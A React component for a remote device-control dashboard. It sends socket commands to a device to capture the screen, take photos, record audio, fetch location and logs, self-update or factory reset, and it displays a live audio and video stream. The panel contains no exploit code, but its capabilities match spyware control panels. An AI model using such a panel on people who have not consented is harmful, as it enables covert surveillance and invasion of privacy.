import React, { useState, useEffect, useRef } from 'react';
import { useParams } from 'react-router-dom';

const DeviceDetail = ({ socket }) => {
  const { deviceId } = useParams();
  const [device, setDevice] = useState(null);
  const [isRecording, setIsRecording] = useState(false);
  const [webrtcConnection, setWebrtcConnection] = useState(null);
  const videoRef = useRef(null);
  const audioRef = useRef(null);

  useEffect(() => {
    if (socket && deviceId) {
      // Request device details
      socket.emit('get_device_details', { deviceId });
      
      socket.on('device_details', (deviceData) => {
        if (deviceData.id === deviceId) {
          setDevice(deviceData);
        }
      });

      // WebRTC setup for real-time audio/video
      setupWebRTC();
    }

    return () => {
      if (webrtcConnection) {
        webrtcConnection.close();
      }
    };
  }, [socket, deviceId]);

  const setupWebRTC = async () => {
    try {
      const pc = new RTCPeerConnection({
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' }
        ]
      });

      pc.ontrack = (event) => {
        const [remoteStream] = event.streams;
        if (videoRef.current) {
          videoRef.current.srcObject = remoteStream;
        }
        if (audioRef.current) {
          audioRef.current.srcObject = remoteStream;
        }
      };

      setWebrtcConnection(pc);
    } catch (error) {
      console.error('WebRTC setup failed:', error);
    }
  };

  const sendCommand = (command, data = {}) => {
    if (socket) {
      socket.emit('device_command', {
        deviceId,
        command,
        data
      });
    }
  };

  const startScreenCapture = () => {
    sendCommand('start_screen_capture');
    setIsRecording(true);
  };

  const stopScreenCapture = () => {
    sendCommand('stop_screen_capture');
    setIsRecording(false);
  };

  const capturePhoto = () => {
    sendCommand('capture_photo');
  };

  const recordAudio = (duration = 30) => {
    sendCommand('record_audio', { duration });
  };

  const getLocation = () => {
    sendCommand('get_location');
  };

  const getLogs = () => {
    sendCommand('get_logs');
  };

  const factoryReset = () => {
    if (window.confirm('Are you sure you want to perform a factory reset? This action cannot be undone.')) {
      sendCommand('factory_reset');
    }
  };

  const selfUpdate = () => {
    sendCommand('self_update');
  };

  if (!device) {
    return (
      <div style={{ 
        display: 'flex', 
        justifyContent: 'center', 
        alignItems: 'center', 
        height: '50vh',
        color: '#a0a0a0' 
      }}>
        Loading device details...
      </div>
    );
  }

  return (
    <div className="device-detail fade-in">
      <div className="control-panel">
        <h2 style={{ marginBottom: '1rem', color: '#00ff88' }}>
          📱 {device.name || `Device ${device.id}`}
        </h2>
        
        <div style={{ marginBottom: '2rem', padding: '1rem', background: '#1a1a2e', borderRadius: '8px' }}>
          <p><strong>Model:</strong> {device.model}</p>
          <p><strong>OS Version:</strong> {device.osVersion}</p>
          <p><strong>Battery:</strong> {device.battery}%</p>
          <p><strong>Location:</strong> {device.location || 'Unknown'}</p>
          <p><strong>Status:</strong> <span className={`device-status ${device.status}`}>{device.status}</span></p>
          <p><strong>Last Seen:</strong> {new Date(device.lastSeen).toLocaleString()}</p>
        </div>

        <h3 style={{ marginBottom: '1rem', color: '#00ff88' }}>🎛️ Control Commands</h3>
        <div className="control-buttons">
          <button 
            className="control-btn" 
            onClick={isRecording ? stopScreenCapture : startScreenCapture}
          >
            {isRecording ? '⏹️ Stop Screen' : '📹 Start Screen'}
          </button>
          
          <button className="control-btn" onClick={capturePhoto}>
            📸 Capture Photo
          </button>
          
          <button className="control-btn" onClick={() => recordAudio(30)}>
            🎤 Record Audio (30s)
          </button>
          
          <button className="control-btn" onClick={getLocation}>
            📍 Get Location
          </button>
          
          <button className="control-btn" onClick={getLogs}>
            📋 Get Logs
          </button>
          
          <button className="control-btn" onClick={selfUpdate}>
            🔄 Self Update
          </button>
          
          <button className="control-btn danger" onClick={factoryReset}>
            ⚠️ Factory Reset
          </button>
        </div>

        <h3 style={{ marginBottom: '1rem', color: '#00ff88' }}>📊 Device Metrics</h3>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
          <div style={{ background: '#1a1a2e', padding: '1rem', borderRadius: '8px' }}>
            <p><strong>CPU Usage:</strong> {device.cpuUsage || 0}%</p>
            <p><strong>Memory Usage:</strong> {device.memoryUsage || 0}%</p>
          </div>
          <div style={{ background: '#1a1a2e', padding: '1rem', borderRadius: '8px' }}>
            <p><strong>Storage Free:</strong> {device.storageFree || 0}GB</p>
            <p><strong>Network Type:</strong> {device.networkType || 'Unknown'}</p>
          </div>
        </div>
      </div>

      <div className="webrtc-container">
        <h3 style={{ marginBottom: '1rem', color: '#00ff88' }}>🔴 Live Stream</h3>
        
        <video 
          ref={videoRef}
          className="webrtc-video"
          autoPlay
          playsInline
          muted
          style={{ width: '100%', height: '300px', marginBottom: '1rem' }}
        />
        
        <audio 
          ref={audioRef}
          autoPlay
          controls
          style={{ width: '100%' }}
        />

        <div style={{ marginTop: '1rem', textAlign: 'center' }}>
          <p style={{ color: '#a0a0a0', fontSize: '0.9rem' }}>
            {webrtcConnection && webrtcConnection.connectionState === 'connected' 
              ? '🟢 Live stream active' 
              : '🔴 Connecting to device...'}
          </p>
        </div>
      </div>
    </div>
  );
};

export default DeviceDetail;